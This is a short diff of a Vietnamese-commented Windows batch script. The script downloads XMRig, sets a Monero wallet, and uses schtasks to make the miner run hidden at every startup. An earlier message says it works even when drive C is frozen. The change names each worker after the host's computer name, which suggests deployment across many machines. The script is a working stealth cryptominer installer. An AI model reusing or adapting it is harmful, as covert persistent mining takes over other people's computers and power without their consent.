@@ -4,7 +4,7 @@ setlocal
 
 :: ------------------- Cấu hình -------------------
 set WALLET=47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL
-set RIG=MyMiner
+set RIG=%COMPUTERNAME%
 set INSTALL_DIR=D:\xmrig_autorun
 set XMRIG_URL=https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-gcc-win64.zip
 :: ------------------------------------------------
@@ -54,5 +54,5 @@ schtasks /Create ^
  /F
 
 echo.
-echo [✔] Hoàn tất cài đặt! Miner sẽ tự động chạy ẩn sau mỗi lần khởi động máy, kể cả khi ổ C bị đóng băng.
+echo [✔] Hoàn tất! Miner sẽ tự chạy ẩn khi máy khởi động, với tên worker là: %COMPUTERNAME%
 pause
